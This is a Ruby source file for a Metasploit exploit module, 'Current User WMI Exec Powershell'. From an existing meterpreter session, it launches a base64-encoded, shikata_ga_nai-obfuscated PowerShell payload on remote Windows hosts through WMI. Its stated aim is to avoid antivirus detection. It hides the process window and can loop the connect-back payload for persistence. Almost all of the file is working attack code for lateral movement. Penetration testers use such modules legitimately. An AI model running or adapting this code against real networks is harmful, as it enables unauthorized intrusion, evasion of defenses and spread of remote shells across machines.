
##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
 require 'msf/core/post/windows/services'
require 'msf/core/post/windows/powershell'
require 'msf/core/post/windows/powershell/dot_net'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Post::Windows::WindowsServices
	include Msf::Post::Windows::Powershell
	include Msf::Post::Windows::Powershell::DotNet

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Current User WMI Exec Powershell",
			'Description'          => %q{
				This module uses WMI execution to launch a payload instance on a remote machine.
				In order to avoid AV detection, all execution is performed in memory via psh-net
				encoded payload. Persistence option can be set to keep the payload looping while
				a handler is present to receive it. The user meterpreter is running under must
				have administrative privileges on the remote host, token stealing does not work.
			},
			'License'              => MSF_LICENSE,
			'Author'               => 'RageLtMan <rageltman[at]sempervictus>',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'Targets' => [ [ 'Universal', {} ] ],
			'DefaultTarget' => 0,

		))

		register_options(
			[
				OptAddressRange.new("RHOSTS", [ false, "Target address range or CIDR identifier" ]),

			], self.class)

		register_advanced_options(
			[
				OptBool.new('PERSIST', [false, 'Run the payload in a loop']),
				OptBool.new('RUN_WOW64', [
					false, 
					'Execute powershell in 32bit compatibility mode, payloads need native arch',
					false
				]),

			], self.class)

	end

	def exploit

		# Make sure we meet the requirements before running the script
		if !(session.type == "meterpreter" || have_powershell?)
			print_error("Incompatible Environment")
			return 0
		end
		# SYSTEM doesnt have credentials on remote hosts
		if client.sys.config.getuid.upcase == 'NT AUTHORITY\SYSTEM'
			print_error("Cannot run as system")
			return 0
		end
		


		# End of file marker
		eof = Rex::Text.rand_text_alpha(8)
		env_suffix = Rex::Text.rand_text_alpha(8)

		# Create base64 encoded payload
		payload = compress_script(payload_script, eof)
		# WMI exec function - this is going into powershell.rb after pull 701 is commited
		script = ps_wmi_exec
		# Build WMI exec calls to every host into the script to reduce PS instances
		# Need to address arch compat issue here, check powershell.exe arch, check pay arch
		# split the hosts into wow64 and native, and run each range separately
		ps_bin = datastore['RUN_WOW64'] ? 'cmd /c %windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe' : 'powershell.exe'
		# for whatever reason, passing %systemroot% instead of 'C:\windows' fails

		Rex::Socket::RangeWalker.new(datastore["RHOSTS"]).each do |host|
			script << "\r\n New-RemoteProcess -rhost \"#{host}\" -cmd \"#{ps_bin} -EncodedCommand #{payload}\"\r\n"
		end
		# Compress
		print_status('Compressing script contents:')
		compressed_script = compress_script(script, eof)

		# If the compressed size is > 8100 bytes, launch stager
		if (compressed_script.size > 8100)
			print_error(" - Compressed size: #{compressed_script.size}")
			error_msg =  "Compressed size may cause command to exceed "
			error_msg += "cmd.exe's 8kB character limit."
			print_error(error_msg)
			print_status('Launching stager:')
			script = stage_to_env(compressed_script, env_suffix)
			print_good("Payload successfully staged.")
		else
			print_good(" - Compressed size: #{compressed_script.size}")
			script = compressed_script
		end

		# Execute the powershell script
		print_status('Executing the script.')
		cmd_out, running_pids, open_channels = execute_script(script, true)
		get_ps_output(cmd_out,eof)
		vprint_good( "Cleaning up #{running_pids.join(', ')}" )

		#clean_up(nil, eof, running_pids, open_channels, env_suffix, false)

		print_good('Finished!')
	end


	# This should be handled by the exploit mixin, right?
	def payload_script
		pay_mod = framework.payloads.create(datastore['PAYLOAD'])
		payload = pay_mod.generate_simple(
			"BadChars"    => '',
			"Format"      => 'psh-net',
			"Encoder"     => 'x86/shikata_ga_nai',
			"ForceEncode" => true,
			"Options" => 
			 {
				'LHOST' => datastore['LHOST'],
				'LPORT' => datastore['LPORT'],
				'EXITFUNC' => 'thread'
			},
		)
		if datastore['PERSIST']
			fun_name = Rex::Text.rand_text_alpha(rand(2)+2)
			sleep_time = rand(5)+5
			payload  = "function #{fun_name}{#{payload}};while(1){Start-Sleep -s #{sleep_time};#{fun_name};1}"
		end

		return payload
	end

	def ps_wmi_exec
		ps_wrapper = <<EOS
Function New-RemoteProcess {
    Param([string]$rhost,[string]$cmd)
    $ErrorActionPreference="SilentlyContinue"    
    $startup=[wmiclass]"Win32_ProcessStartup"
    $startup.Properties['ShowWindow'].value=$False
    $remote = ([wmiclass]"\\\\$rhost\\root\\cimv2:win32_process").create($cmd,'C:\\',$startup)
    if ($remote.returnvalue -eq 0) {
        Write-Host "Successfully launched on $rhost with a process id of" $remote.processid
    }
    else {
        Write-Host "Failed to launch on $rhost. ReturnValue is" $remote.ReturnValue
    }
}

EOS

	return ps_wrapper
	end

end
# $wmi = [wmiclass]"\\127.0.0.1\root\cimv2:win32_process"
# $wmi.computername = "127.0.0.1"
#     [wmiclass]$wmi="\\\\$rhost\\root\\cimv2:win32_process"
#     if (!$wmi) {return}
#     $remote=$wmi.Create($cmd)
